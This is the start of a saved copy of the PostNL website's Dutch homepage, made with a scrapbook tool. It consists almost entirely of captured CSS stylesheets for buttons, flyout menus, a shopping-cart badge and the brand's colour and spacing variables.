
<!DOCTYPE html><html lang="nl" class="hydrated" data-scrapbook-source="https://www.postnl.nl/nl" data-scrapbook-create="20250606000511374" data-scrapbook-adoptedstylesheet-2=":host { display: block; }" data-scrapbook-adoptedstylesheet-9=":host { display: block; }

.shop-toastr { bottom: 0px; left: 0px; position: fixed; width: 100%; z-index: 100; }

@keyframes toasterAnimation {
  0% { opacity: 1; transform: translateY(200px); }
  100% { opacity: 1; transform: translateY(0px); }
}

.shop-toastr-motion { width: 100%; animation: 0.3s ease-in-out forwards toasterAnimation; }

.shop-toastr-notification { background-color: rgba(0, 0, 0, 0.6); min-height: 169px; padding: 0 var(--stamp-spacing-outer-l); position: relative; }

.shop-toastr-notification-close-button { position: absolute; right: var(--stamp-spacing-inner-m); top: var(--stamp-spacing-inner-m); }

.shop-toastr-notification-close-button svg { color: var(--stamp-color-heading-on-brand); }

.shop-toastr-notification-content { gap: var(--stamp-spacing-inner-xl); }

.shop-toastr-notification-title { color: var(--stamp-color-heading-on-brand); text-align: center; }

.shop-toastr-notification-button { width: fit-content; }

@media (width >= 769px) {
  .shop-toastr-notification-close-button { right: var(--stamp-spacing-inner-l); top: var(--stamp-spacing-inner-l); }
}" data-scrapbook-adoptedstylesheet-0=":host { display: block; }

.shop-mini-cart-visual { align-items: center; display: flex; flex-direction: column; justify-content: center; position: relative; top: 4px; }

.shop-mini-cart-visual-trigger .stamp-icon--size-m { block-size: calc(var(--stamp-size-icon-m) * 1.1); inline-size: calc(var(--stamp-size-icon-m) * 1.1); }

.shop-mini-cart-visual-trigger--mobile.stamp-icon-button { display: flex; }

.shop-mini-cart-visual-trigger--desktop.stamp-icon-button { display: none; }

@media (width >= 1000px) {
  .shop-mini-cart-visual-trigger--mobile.stamp-icon-button { display: none; }
  .shop-mini-cart-visual-trigger--desktop.stamp-icon-button { display: flex; }
}

.shop-mini-cart-visual-count { --badge-size: 20px; background-color: var(--stamp-color-background-notification); border-radius: 100%; color: var(--stamp-color-text-inverse); cursor: pointer; font-family: var(--stamp-text-badge-default-font-family); font-size: var(--stamp-text-badge-default-font-size); font-weight: var(--stamp-text-badge-default-font-weight); height: var(--badge-size); letter-spacing: var(--stamp-text-badge-default-letter-spacing); line-height: var(--badge-size); position: absolute; right: calc(var(--stamp-spacing-inner-s) - (var(--badge-size) / 2)); text-align: center; top: 0px; user-select: none; vertical-align: middle; width: var(--badge-size); }

.shop-mini-cart-visual-count--mobile { display: block; }

.shop-mini-cart-visual-count--desktop { display: none; }

@media (width >= 1000px) {
  .shop-mini-cart-visual-count--mobile { display: none; }
  .shop-mini-cart-visual-count--desktop { display: block; }
}

.shop-mini-cart-visual-flyout-wrapper { display: none; }

@media (width >= 1000px) {
  .shop-mini-cart-visual-flyout-wrapper { display: block; }
}" data-scrapbook-adoptedstylesheet-5=".stamp-button, a.stamp-button { position: relative; max-inline-size: 100%; cursor: pointer; padding-block: var(--stamp-spacing-inner-s); padding-inline: var(--stamp-spacing-inner-xl); border-style: solid; border-width: var(--stamp-border-width-s); font-family: var(--stamp-text-cta-default-font-family), sans-serif; font-weight: var(--stamp-text-cta-default-font-weight); line-height: var(--stamp-text-cta-default-line-height); font-size: var(--stamp-text-cta-default-font-size); letter-spacing: var(--stamp-text-cta-default-letter-spacing); text-decoration: none; }

.stamp-button:hover { font-family: var(--stamp-text-cta-hover-font-family), sans-serif; font-weight: var(--stamp-text-cta-hover-font-weight); line-height: var(--stamp-text-cta-hover-line-height); text-decoration: var(--stamp-text-cta-hover-text-decoration); font-size: var(--stamp-text-cta-hover-font-size); }

.stamp-button:active { font-family: var(--stamp-text-cta-pressed-font-family), sans-serif; font-weight: var(--stamp-text-cta-pressed-font-weight); line-height: var(--stamp-text-cta-pressed-line-height); text-decoration: var(--stamp-text-cta-pressed-text-decoration); font-size: var(--stamp-text-cta-pressed-font-size); }

.stamp-button--size-auto { inline-size: auto; }

.stamp-button--size-full { inline-size: 100%; }

@media (min-width: 481px) {
  .stamp-button--size-full, a.stamp-button--size-full { inline-size: auto; }
}

.stamp-button--variant-primary:focus, .stamp-button--variant-secondary:focus, .stamp-button--variant-tertiary:focus { outline-color: var(--stamp-color-border-focus-outline); outline-style: solid; outline-width: var(--stamp-border-width-m); outline-offset: 1px; }

@supports selector(:focus-visible) {
  .stamp-button--variant-primary:focus, .stamp-button--variant-secondary:focus, .stamp-button--variant-tertiary:focus { outline: none; }
  .stamp-button--variant-primary:focus-visible, .stamp-button--variant-secondary:focus-visible, .stamp-button--variant-tertiary:focus-visible { outline-color: var(--stamp-color-border-focus-outline); outline-style: solid; outline-width: var(--stamp-border-width-m); outline-offset: 1px; }
}

.stamp-button--variant-primary, a.stamp-button--variant-primary { background-color: var(--stamp-color-background-button-primary-default); border-color: var(--stamp-color-border-button-primary-default); border-radius: var(--stamp-radius-xs); }

.stamp-button--variant-primary, a.stamp-button--variant-primary, .stamp-button--variant-primary:hover, a.stamp-button--variant-primary:hover { color: var(--stamp-color-text-button-primary-default); }

.stamp-button--variant-primary:active, a.stamp-button--variant-primary:active { background-color: var(--stamp-color-background-button-primary-pressed); color: var(--stamp-color-text-button-primary-pressed); border-color: var(--stamp-color-border-button-primary-pressed); }

.stamp-button--variant-secondary, a.stamp-button--variant-secondary { background-color: var(--stamp-color-background-button-secondary-default); border-color: var(--stamp-color-border-button-secondary-default); border-radius: var(--stamp-radius-xs); border-style: solid; }

.stamp-button--variant-secondary, a.stamp-button--variant-secondary, .stamp-button--variant-secondary:hover, a.stamp-button--variant-secondary:hover { color: var(--stamp-color-text-button-secondary-default); }

.stamp-button--variant-secondary:active, a.stamp-button--variant-secondary:active { background-color: var(--stamp-color-background-button-secondary-pressed); border-color: var(--stamp-color-border-button-secondary-pressed); color: var(--stamp-color-text-button-secondary-pressed); }

.stamp-button--variant-tertiary, a.stamp-button--variant-tertiary { background-color: var(--stamp-color-background-button-tertiary-default); border-color: var(--stamp-color-border-button-tertiary-default); border-radius: var(--stamp-radius-xs); }

.stamp-button--variant-tertiary, a.stamp-button--variant-tertiary, .stamp-button--variant-tertiary:hover, a.stamp-button--variant-tertiary:hover { color: var(--stamp-color-text-button-tertiary-default); }

.stamp-button--variant-tertiary:active, a.stamp-button--variant-tertiary:active { background-color: var(--stamp-color-background-button-tertiary-pressed); border-color: var(--stamp-color-border-button-tertiary-pressed); color: var(--stamp-color-text-button-tertiary-pressed); }

.stamp-button__icon { display: flex; justify-content: center; align-items: center; max-inline-size: var(--stamp-size-icon-s); max-block-size: var(--stamp-size-icon-s); }

.stamp-button--variant-primary .stamp-button__icon, .stamp-button--variant-primary .stamp-button__spinner { color: var(--stamp-color-icon-button-primary-default); }

.stamp-button--variant-primary:active .stamp-button__icon { color: var(--stamp-color-icon-button-primary-pressed); }

.stamp-button--variant-secondary .stamp-button__icon, .stamp-button--variant-secondary .stamp-button__spinner { color: var(--stamp-color-icon-button-secondary-default); }

.stamp-button--variant-secondary:active .stamp-button__icon { color: var(--stamp-color-icon-button-secondary-pressed); }

.stamp-button--variant-tertiary .stamp-button__icon, .stamp-button--variant-tertiary .stamp-button__spinner { color: var(--stamp-color-icon-button-tertiary-default); }

.stamp-button--variant-tertiary:active .stamp-button__icon { color: var(--stamp-color-icon-button-tertiary-pressed); }

.stamp-button__content { display: inline-flex; vertical-align: middle; gap: var(--stamp-spacing-inner-s); align-items: center; justify-content: center; max-inline-size: 100%; inline-size: 100%; text-decoration: inherit; }

.stamp-button--loading .stamp-button__content { visibility: hidden; }

.stamp-button__overlay { position: absolute; inset: 0px; inline-size: 100%; block-size: 100%; z-index: 1; display: flex; align-items: center; justify-content: center; }

@font-face { src: url(&quot;&quot;) format(&quot;woff2&quot;); }

@font-face { src: url(&quot;&quot;) format(&quot;woff2&quot;); }

:host(*) { border-block: initial; border-inline: initial; border-start-start-radius: initial; border-start-end-radius: initial; border-end-start-radius: initial; border-end-end-radius: initial; overflow-block: initial; overflow-inline: initial; overscroll-behavior-block: initial; overscroll-behavior-inline: initial; margin-block: initial; margin-inline: initial; scroll-margin-block: initial; scroll-margin-inline: initial; padding-block: initial; padding-inline: initial; scroll-padding-block: initial; scroll-padding-inline: initial; inset-block: initial; inset-inline: initial; block-size: initial; min-block-size: initial; max-block-size: initial; inline-size: initial; min-inline-size: initial; max-inline-size: initial; contain-intrinsic-block-size: initial; contain-intrinsic-inline-size: initial; background: initial; background-blend-mode: initial; border: initial; border-radius: initial; box-decoration-break: initial; -moz-float-edge: initial; display: initial; position: initial; float: initial; clear: initial; vertical-align: initial; baseline-source: initial; overflow: initial; overflow-anchor: initial; transform: initial; rotate: initial; scale: initial; translate: initial; offset: initial; scroll-behavior: initial; scroll-snap-align: initial; scroll-snap-type: initial; scroll-snap-stop: initial; overscroll-behavior: initial; isolation: initial; break-after: initial; break-before: initial; break-inside: initial; resize: initial; perspective: initial; perspective-origin: initial; backface-visibility: initial; transform-box: initial; transform-style: initial; transform-origin: initial; contain: initial; content-visibility: initial; container: initial; appearance: initial; -moz-orient: initial; will-change: initial; shape-image-threshold: initial; shape-margin: initial; shape-outside: initial; touch-action: initial; -webkit-line-clamp: initial; scrollbar-gutter: initial; zoom: initial; columns: initial; column-fill: initial; column-rule: initial; column-span: initial; content: initial; counter-increment: initial; counter-reset: initial; counter-set: initial; opacity: initial; box-shadow: initial; clip: initial; filter: initial; backdrop-filter: initial; mix-blend-mode: initial; font-style: initial; font-variant: initial; font-weight: initial; font-size-adjust: initial; font-synthesis: initial; font-stretch: initial; font-kerning: initial; font-variation-settings: initial; font-language-override: initial; font-optical-sizing: initial; font-palette: initial; math-depth: initial; math-style: initial; line-height: initial; visibility: initial; writing-mode: initial; text-orientation: initial; print-color-adjust: initial; image-rendering: initial; image-orientation: initial; dominant-baseline: initial; text-anchor: initial; color-interpolation: initial; color-interpolation-filters: initial; fill: initial; fill-opacity: initial; fill-rule: initial; shape-rendering: initial; stroke: initial; stroke-width: initial; stroke-linecap: initial; stroke-linejoin: initial; stroke-miterlimit: initial; stroke-opacity: initial; stroke-dasharray: initial; stroke-dashoffset: initial; clip-rule: initial; marker: initial; paint-order: initial; border-collapse: initial; empty-cells: initial; caption-side: initial; border-spacing: initial; color: initial; text-transform: initial; hyphens: initial; -moz-text-size-adjust: initial; text-indent: initial; overflow-wrap: initial; word-break: initial; text-justify: initial; text-align-last: initial; text-align: initial; letter-spacing: initial; word-spacing: initial; white-space: initial; text-shadow: initial; text-emphasis: initial; text-emphasis-position: initial; tab-size: initial; line-break: initial; -webkit-text-fill-color: initial; -webkit-text-stroke: initial; ruby-align: initial; ruby-position: initial; text-combine-upright: initial; text-rendering: initial; text-underline-offset: initial; text-underline-position: initial; text-decoration-skip-ink: initial; hyphenate-character: initial; forced-color-adjust: initial; -webkit-text-security: initial; hyphenate-limit-chars: initial; text-wrap: initial; cursor: initial; pointer-events: initial; caret-color: initial; accent-color: initial; color-scheme: initial; scrollbar-color: initial; list-style: initial; quotes: initial; margin: initial; overflow-clip-margin: initial; scroll-margin: initial; outline: initial; outline-offset: initial; padding: initial; scroll-padding: initial; page: initial; inset: initial; z-index: initial; flex-flow: initial; place-content: initial; place-items: initial; flex: initial; place-self: initial; order: initial; height: initial; min-height: initial; max-height: initial; width: initial; min-width: initial; max-width: initial; object-fit: initial; object-position: initial; grid-area: initial; grid: initial; gap: initial; aspect-ratio: initial; contain-intrinsic-size: initial; vector-effect: initial; stop-color: initial; stop-opacity: initial; flood-color: initial; flood-opacity: initial; lighting-color: initial; mask-type: initial; clip-path: initial; mask: initial; x: initial; y: initial; cx: initial; cy: initial; rx: initial; ry: initial; r: initial; d: initial; table-layout: initial; text-overflow: initial; text-decoration: initial; ime-mode: initial; scrollbar-width: initial; user-select: initial; -moz-window-dragging: initial; -moz-force-broken-image-icon: initial; transition: initial; animation: initial; animation-composition: initial; -moz-box-align: initial; -moz-box-direction: initial; -moz-box-flex: initial; -moz-box-orient: initial; -moz-box-pack: initial; -moz-box-ordinal-group: initial; font-family: &quot;Hanken Grotesk&quot;, Arial, Helvetica, sans-serif; font-feature-settings: &quot;ss03&quot;, &quot;ss01&quot;; font-size: 16px; box-sizing: border-box !important; }

.pnl-shipment-search { display: flex; flex-direction: column; max-width: 57.125em; }

@media (max-width: 57em) {
  .pnl-shipment-search { max-width: 21.375em; }
}

.pnl-shipment-search h1 { margin-bottom: 1rem; color: rgb(0, 26, 115); font-family: &quot;ABC-ROM&quot;, Arial, Helvetica, sans-serif; font-synthesis: none; font-weight: 700; font-size: 2rem; line-height: 1.111; text-align: left; display: block; }" data-scrapbook-adoptedstylesheet-3="html { text-rendering: optimizespeed; }

@media (min-width: 480px) {
  html { text-rendering: optimizelegibility; }
}

@media (min-device-pixel-ratio: 2), (-webkit-min-device-pixel-ratio: 2), (min-resolution: 192dpi) {
  html { }
}

*, ::before, ::after { box-sizing: inherit; }

html { box-sizing: border-box; }

.pci-button { position: relative; display: flex; width: 100%; align-items: center; padding: 8px 24px; justify-content: center; color: rgb(255, 255, 255); border-radius: 20px; background-color: rgb(52, 64, 182); border: 1px solid rgb(52, 64, 182); transition: 250ms cubic-bezier(0.4, 0, 0.2, 1); font-size: inherit; font-weight: 500; font-family: inherit; cursor: pointer; user-select: none; appearance: none; }

.pci-button .pci-icon { margin-left: 8px; }

@media (min-width: 400px) {
  .pci-button { display: inline-flex; width: auto; }
}

.pci-button:hover .pci-button__text { text-decoration: underline; }

.pci-button:focus { outline: none; }

.pci-button:focus-visible { outline: none; box-shadow: rgb(255, 255, 255) 0px 0px 0px 1px, rgb(52, 64, 182) 0px 0px 0px 3px; }

.pci-button:active { background-color: rgb(0, 26, 115); }

.pci-button--no-bg { color: rgb(237, 112, 0); background-color: transparent; }

.pci-button--no-bg:hover { color: rgb(102, 114, 138); background-color: transparent; }

.pci-button--secondary { color: rgb(52, 64, 182); background-color: rgb(255, 255, 255); }

.pci-button--secondary:hover { background-color: rgb(255, 255, 255); }

.pci-button--secondary:active { color: rgb(0, 26, 115); background-color: transparent; }

.pci-button--text { min-width: auto; align-self: center; padding: 0px; color: rgb(52, 64, 182); background: none; border-style: solid; border-color: transparent; border-image: none; border-radius: 2px; border-width: 0px 2px; }

.pci-button--text .pci-button__text { transition: 250ms cubic-bezier(0.4, 0, 0.2, 1); }

.pci-button--text:hover { background: none; box-shadow: none; }

.pci-button--text:hover .pci-button__text { text-decoration: underline; }

.pci-button--text:active { color: rgb(0, 26, 115); background-color: rgb(255, 255, 255); }

.pci-button--icon { padding: 10px; font-size: 24px; min-width: auto; }

.pci-button--loading { padding: 0px; min-width: unset; transition: none; }

.pci-button--loading .pci-loader, .pci-button--loading .pci-spinner { display: block; }

.pci-button .pci-icon + .pci-button__text { margin-left: 8px; }

.pci-button .pci-button__text { transform: translateY(-1px); }

.pci-flyout { display: inline-block; position: relative; }

.pci-flyout__trigger { display: flex; align-items: center; padding: 0px 0px 0px 8px; }

.pci-flyout__trigger .pci-button__text { max-width: 8ch; overflow: hidden; white-space: nowrap; text-overflow: ellipsis; }

@media (min-width: 768px) {
  .pci-flyout__trigger .pci-button__text { max-width: 15ch; }
}

.pci-flyout__trigger .pci-flyout__icon { display: flex; color: rgb(237, 112, 0); margin-left: 8px; align-items: center; transition: transform 250ms cubic-bezier(0.4, 0, 0.2, 1), transform 250ms cubic-bezier(0.4, 0, 0.2, 1); }

.contrast .pci-flyout__trigger .pci-flyout__icon { color: rgb(52, 64, 182); }

.pci-flyout__trigger[aria-expanded=&quot;false&quot;] .pci-flyout__icon { transform: rotate(-180deg); }

.pci-flyout__list { margin: 0px; left: -50%; padding: 16px; z-index: 9999; list-style: none; position: absolute; top: calc(100% + 16px); background-color: rgb(255, 255, 255); transform: translateX(8px); border-radius: 4px 4px 0px; box-shadow: rgba(0, 0, 0, 0.15) 3px 0px 9px 0px; }

@media (min-width: 768px) {
  .pci-flyout__list { width: auto; }
}

.pci-flyout__list::before { position: absolute; top: 0px; left: 50%; width: 14px; height: 14px; content: &quot;&quot;; background: rgb(255, 255, 255); border-top: 1px solid rgb(232, 232, 232); border-left: 1px solid rgb(232, 232, 232); transform: rotate(45deg) translateX(-10px); }

.pci-flyout__list-item { display: flex; white-space: nowrap; }

.pci-flyout__list-item + .pci-flyout__list-item { margin-top: 16px !important; }

.pci-flyout__list-item:last-child { flex-wrap: wrap; }

.pci-flyout__label { display: block; width: 100%; font-weight: 400; margin-bottom: 8px; }

.pci-flyout__status { height: 30px; width: 30px; }

.pci-flyout__icon { color: rgb(237, 112, 0); margin-right: 16px; vertical-align: middle; }

.contrast .pci-flyout__icon { color: rgb(52, 64, 182); }

.pci-flyout__icon > svg { width: 18px; }

.pci-flyout__list-item .pci-flyout__icon > svg { width: 26px; }

.pci-flyout__link { display: table; text-decoration: none; color: rgb(237, 112, 0) !important; border-bottom: 1px solid transparent; transition: 250ms cubic-bezier(0.4, 0, 0.2, 1); }

.contrast .pci-flyout__link { color: rgb(52, 64, 182); }

.pci-flyout__link:hover, .pci-flyout__link:focus { color: rgb(237, 112, 0); border-bottom-color: rgb(237, 112, 0); }

.contrast .pci-flyout__link:hover, .contrast .pci-flyout__link:focus { color: rgb(52, 64, 182); border-bottom-color: rgb(52, 64, 182); }

:root { --white: #ffffff; --postnl-orange: #ff8d00; --black: #000000; --postnl-dark-orange: #ed7000; --postnl-blue: #3440b6; --light-grey: #d4d9e3; --light-blue: #009ee3; --deep-blue: #001a73; --action-red: #d70036; --intense-orange: #e75204; --light-grey-tone: #f3f4f7; --grey: #adb5c5; --titanium-grey: #8a94a8; --medium-grey: #66728a; --dark-grey: #27324c; --overlay: rgba(0 0 0 0.6); --light-blue-tone: #f1f2f9; --light-beige: #f9f5ef; --package: #ebdbc8; --smoke: #fbfbfb; --ice: #eaebf7; --information-fill: #ebf8fd; --information-border: #8dd4f1; --information-text: #009ee3; --success-fill: #ebf7ef; --success-border: #7bc997; --success-text: #3aaa35; --warning-fill: #fff9ec; --warning-border: #fbc54f; --warning-text: #fbc54f; --error-fill: #fcebef; --error-border: #ea7b97; --error-text: #d70036; --drop-shadow--small: 3px 0 9px 0 rgba(0, 0, 0, 0.15); --drop-shadow: 0 9px 12px 0 rgba(0, 0, 0, 0.25); --focus-ring: 0 0 0 1px var(--white), 0 0 0 3px var(--postnl-blue); --focus-ring--input: 0 0 0 1px var(--titanium-grey), 0 0 0 3px var(--postnl-blue); }

:root { --space-2: 2px; --space-4: 4px; --space-8: 8px; --space-12: 12px; --space-16: 16px; --space-20: 20px; --space-24: 24px; --space-32: 32px; --space-40: 40px; --space-48: 48px; --space-56: 56px; --space-64: 64px; --space-72: 72px; --space-80: 80px; --space-88: 88px; --space-96: 96px; --space-99: 99px; }

:host(*) { border-block: initial; border-inline: initial; border-start-start-radius: initial; border-start-end-radius: initial; border-end-start-radius: initial; border-end-end-radius: initial; overflow-block: initial; overflow-inline: initial; overscroll-behavior-block: initial; overscroll-behavior-inline: initial; margin-block: initial; margin-inline: initial; scroll-margin-block: initial; scroll-margin-inline: initial; padding-block: initial; padding-inline: initial; scroll-padding-block: initial; scroll-padding-inline: initial; inset-block: initial; inset-inline: initial; block-size: initial; min-block-size: initial; max-block-size: initial; inline-size: initial; min-inline-size: initial; max-inline-size: initial; contain-intrinsic-block-size: initial; contain-intrinsic-inline-size: initial; background: initial; background-blend-mode: initial; border: initial; border-radius: initial; box-decoration-break: initial; -moz-float-edge: initial; display: initial; position: initial; float: initial; clear: initial; vertical-align: initial; baseline-source: initial; overflow: initial; overflow-anchor: initial; transform: initial; rotate: initial; scale: initial; translate: initial; offset: initial; scroll-behavior: initial; scroll-snap-align: initial; scroll-snap-type: initial; scroll-snap-stop: initial; overscroll-behavior: initial; isolation: initial; break-after: initial; break-before: initial; break-inside: initial; resize: initial; perspective: initial; perspective-origin: initial; backface-visibility: initial; transform-box: initial; transform-style: initial; transform-origin: initial; contain: initial; content-visibility: initial; container: initial; appearance: initial; -moz-orient: initial; will-change: initial; shape-image-threshold: initial; shape-margin: initial; shape-outside: initial; touch-action: initial; -webkit-line-clamp: initial; scrollbar-gutter: initial; zoom: initial; columns: initial; column-fill: initial; column-rule: initial; column-span: initial; content: initial; counter-increment: initial; counter-reset: initial; counter-set: initial; opacity: initial; box-shadow: initial; clip: initial; filter: initial; backdrop-filter: initial; mix-blend-mode: initial; font-style: initial; font-variant: initial; font-weight: initial; font-size-adjust: initial; font-synthesis: initial; font-stretch: initial; font-kerning: initial; font-feature-settings: initial; font-variation-settings: initial; font-language-override: initial; font-optical-sizing: initial; font-palette: initial; math-depth: initial; math-style: initial; line-height: initial; visibility: initial; writing-mode: initial; text-orientation: initial; print-color-adjust: initial; image-rendering: initial; image-orientation: initial; dominant-baseline: initial; text-anchor: initial; color-interpolation: initial; color-interpolation-filters: initial; fill: initial; fill-opacity: initial; fill-rule: initial; shape-rendering: initial; stroke: initial; stroke-width: initial; stroke-linecap: initial; stroke-linejoin: initial; stroke-miterlimit: initial; stroke-opacity: initial; stroke-dasharray: initial; stroke-dashoffset: initial; clip-rule: initial; marker: initial; paint-order: initial; border-collapse: initial; empty-cells: initial; caption-side: initial; border-spacing: initial; color: initial; text-transform: initial; hyphens: initial; -moz-text-size-adjust: initial; text-indent: initial; overflow-wrap: initial; word-break: initial; text-justify: initial; text-align-last: initial; text-align: initial; letter-spacing: initial; word-spacing: initial; white-space: initial; text-shadow: initial; text-emphasis: initial; text-emphasis-position: initial; tab-size: initial; line-break: initial; -webkit-text-fill-color: initial; -webkit-text-stroke: initial; ruby-align: initial; ruby-position: initial; text-combine-upright: initial; text-rendering: initial; text-underline-offset: initial; text-underline-position: initial; text-decoration-skip-ink: initial; hyphenate-character: initial; forced-color-adjust: initial; -webkit-text-security: initial; hyphenate-limit-chars: initial; text-wrap: initial; cursor: initial; pointer-events: initial; caret-color: initial; accent-color: initial; color-scheme: initial; scrollbar-color: initial; list-style: initial; quotes: initial; margin: initial; overflow-clip-margin: initial; scroll-margin: initial; outline: initial; outline-offset: initial; padding: initial; scroll-padding: initial; page: initial; inset: initial; z-index: initial; flex-flow: initial; place-content: initial; place-items: initial; flex: initial; place-self: initial; order: initial; height: initial; min-height: initial; max-height: initial; width: initial; min-width: initial; max-width: initial; box-sizing: initial; object-fit: initial; object-position: initial; grid-area: initial; grid: initial; gap: initial; aspect-ratio: initial; contain-intrinsic-size: initial; vector-effect: initial; stop-color: initial; stop-opacity: initial; flood-color: initial; flood-opacity: initial; lighting-color: initial; mask-type: initial; clip-path: initial; mask: initial; x: initial; y: initial; cx: initial; cy: initial; rx: initial; ry: initial; r: initial; d: initial; table-layout: initial; text-overflow: initial; text-decoration: initial; ime-mode: initial; scrollbar-width: initial; user-select: initial; -moz-window-dragging: initial; -moz-force-broken-image-icon: initial; transition: initial; animation: initial; animation-composition: initial; -moz-box-align: initial; -moz-box-direction: initial; -moz-box-flex: initial; -moz-box-orient: initial; -moz-box-pack: initial; -moz-box-ordinal-group: initial; font-family: &quot;Post-sans&quot;, sans-serif; font-size: 16px; }

@media (max-width: 57em) {
  .is-hidden { display: none; }
}" data-scrapbook-adoptedstylesheet-4="@font-face { src: url(&quot;&quot;) format(&quot;woff2&quot;); }

@font-face { src: url(&quot;&quot;) format(&quot;woff2&quot;); }

@font-face { src: url(&quot;&quot;) format(&quot;woff2&quot;); }

@font-face { src: url(&quot;&quot;) format(&quot;woff2&quot;); }

.pci-button-container { display: flex; margin-top: 1.5rem; justify-content: left; }

.pci-button { width: 100%; min-width: 8em; height: 40px; border: medium; display: flex; color: rgb(255, 255, 255); cursor: pointer; font-weight: 700; font-size: 1rem; user-select: none; font-family: &quot;Hanken Grotesk&quot;, Arial, Helvetica, sans-serif, sans-serif; font-feature-settings: &quot;ss03&quot;, &quot;ss01&quot;; align-items: center; padding: 0.5em 1.5em; justify-content: center; background-color: rgb(97, 97, 255); border-radius: 0.25em; transition: none; }

@media (min-width: 57em) {
  .pci-button { width: auto; }
}

.pci-button:hover { text-decoration: underline; text-underline-offset: 0.15em; }

.pci-button:focus:not(:focus-visible) { outline: none; }

.pci-button:focus-visible { outline: rgb(0, 26, 115) solid 2px; outline-offset: 1px; }

.pci-button:active { color: rgb(255, 255, 255); background-color: rgb(0, 26, 115); text-decoration: underline; text-underline-offset: 0.15em; }

.pci-button--secondary { color: rgb(97, 97, 255); background-color: rgb(255, 255, 255); border: 1px solid rgb(97, 97, 255); border-radius: 0.25em; }

.pci-button--secondary:hover { text-decoration: underline; text-underline-offset: 0.15em; }

.pci-button--secondary:focus:not(:focus-visible) { outline: none; }

.pci-button--secondary:focus-visible { outline: rgb(0, 26, 115) solid 2px; outline-offset: 1px; }

.pci-button--secondary:active { color: rgb(0, 26, 115); background-color: rgb(255, 255, 255); text-decoration: underline; text-underline-offset: 0.15em; border: 1px solid rgb(0, 26, 115); border-radius: 0.25em; }

.pci-button--tertiary { background-color: rgb(255, 255, 255); border: medium; color: rgb(97, 97, 255); }

.pci-button--tertiary:active { background-color: rgba(255, 255, 255, 0); border-color: rgba(255, 255, 255, 0); color: rgb(0, 26, 115); }

.pci-button--tertiary:hover { text-decoration: underline; text-underline-offset: 0.15em; }

.pci-button--tertiary:focus:not(:focus-visible) { outline: none; }

.pci-button--tertiary:focus-visible { outline: rgb(0, 26, 115) solid 2px; outline-offset: 1px; }

html { text-rendering: optimizespeed; }

@media (min-width: 480px) {
  html { text-rendering: optimizelegibility; }
}

@media (min-device-pixel-ratio: 2), (-webkit-min-device-pixel-ratio: 2), (min-resolution: 192dpi) {
  html { }
}

*, ::before, ::after { box-sizing: inherit; }

html { box-sizing: border-box; }

.pci-flyout { display: inline-block; position: relative; }

.pci-flyout__trigger { display: flex; align-items: center; padding: 0px 0px 0px 8px; }

.pci-flyout__trigger .pci-button__text { max-width: 8ch; overflow: hidden; white-space: nowrap; text-overflow: ellipsis; }

@media (min-width: 768px) {
  .pci-flyout__trigger .pci-button__text { max-width: 15ch; }
}

.pci-flyout__trigger .pci-flyout__icon { display: flex; color: rgb(237, 112, 0); margin-left: 8px; align-items: center; transition: transform 250ms cubic-bezier(0.4, 0, 0.2, 1), transform 250ms cubic-bezier(0.4, 0, 0.2, 1); }

.contrast .pci-flyout__trigger .pci-flyout__icon { color: rgb(52, 64, 182); }

.pci-flyout__trigger[aria-expanded=&quot;false&quot;] .pci-flyout__icon { transform: rotate(-180deg); }

.pci-flyout__list { margin: 0px; left: -50%; padding: 16px; z-index: 9999; list-style: none; position: absolute; top: calc(100% + 16px); background-color: rgb(255, 255, 255); transform: translateX(8px); border-radius: 4px 4px 0px; box-shadow: rgba(0, 0, 0, 0.15) 3px 0px 9px 0px; }

@media (min-width: 768px) {
  .pci-flyout__list { width: auto; }
}

.pci-flyout__list::before { position: absolute; top: 0px; left: 50%; width: 14px; height: 14px; content: &quot;&quot;; background: rgb(255, 255, 255); border-top: 1px solid rgb(232, 232, 232); border-left: 1px solid rgb(232, 232, 232); transform: rotate(45deg) translateX(-10px); }

.pci-flyout__list-item { display: flex; white-space: nowrap; }

.pci-flyout__list-item + .pci-flyout__list-item { margin-top: 16px !important; }

.pci-flyout__list-item:last-child { flex-wrap: wrap; }

.pci-flyout__label { display: block; width: 100%; font-weight: 400; margin-bottom: 8px; }

.pci-flyout__status { height: 30px; width: 30px; }

.pci-flyout__icon { color: rgb(237, 112, 0); margin-right: 16px; vertical-align: middle; }

.contrast .pci-flyout__icon { color: rgb(52, 64, 182); }

.pci-flyout__icon > svg { width: 18px; }

.pci-flyout__list-item .pci-flyout__icon > svg { width: 26px; }

.pci-flyout__link { display: table; text-decoration: none; color: rgb(237, 112, 0) !important; border-bottom: 1px solid transparent; transition: 250ms cubic-bezier(0.4, 0, 0.2, 1); }

.contrast .pci-flyout__link { color: rgb(52, 64, 182); }

.pci-flyout__link:hover, .pci-flyout__link:focus { color: rgb(237, 112, 0); border-bottom-color: rgb(237, 112, 0); }

.contrast .pci-flyout__link:hover, .contrast .pci-flyout__link:focus { color: rgb(52, 64, 182); border-bottom-color: rgb(52, 64, 182); }

:root { --white: #ffffff; --postnl-orange: #ff8d00; --black: #000000; --postnl-dark-orange: #ed7000; --postnl-blue: #3440b6; --light-grey: #d4d9e3; --light-blue: #009ee3; --deep-blue: #001a73; --action-red: #d70036; --intense-orange: #e75204; --light-grey-tone: #f3f4f7; --grey: #adb5c5; --titanium-grey: #8a94a8; --medium-grey: #66728a; --dark-grey: #27324c; --overlay: rgba(0 0 0 0.6); --light-blue-tone: #f1f2f9; --light-beige: #f9f5ef; --package: #ebdbc8; --smoke: #fbfbfb; --ice: #eaebf7; --information-fill: #ebf8fd; --information-border: #8dd4f1; --information-text: #009ee3; --success-fill: #ebf7ef; --success-border: #7bc997; --success-text: #3aaa35; --warning-fill: #fff9ec; --warning-border: #fbc54f; --warning-text: #fbc54f; --error-fill: #fcebef; --error-border: #ea7b97; --error-text: #d70036; --drop-shadow--small: 3px 0 9px 0 rgba(0, 0, 0, 0.15); --drop-shadow: 0 9px 12px 0 rgba(0, 0, 0, 0.25); --focus-ring: 0 0 0 1px var(--white), 0 0 0 3px var(--postnl-blue); --focus-ring--input: 0 0 0 1px var(--titanium-grey), 0 0 0 3px var(--postnl-blue); }

:root { --space-2: 2px; --space-4: 4px; --space-8: 8px; --space-12: 12px; --space-16: 16px; --space-20: 20px; --space-24: 24px; --space-32: 32px; --space-40: 40px; --space-48: 48px; --space-56: 56px; --space-64: 64px; --space-72: 72px; --space-80: 80px; --space-88: 88px; --space-96: 96px; --space-99: 99px; }

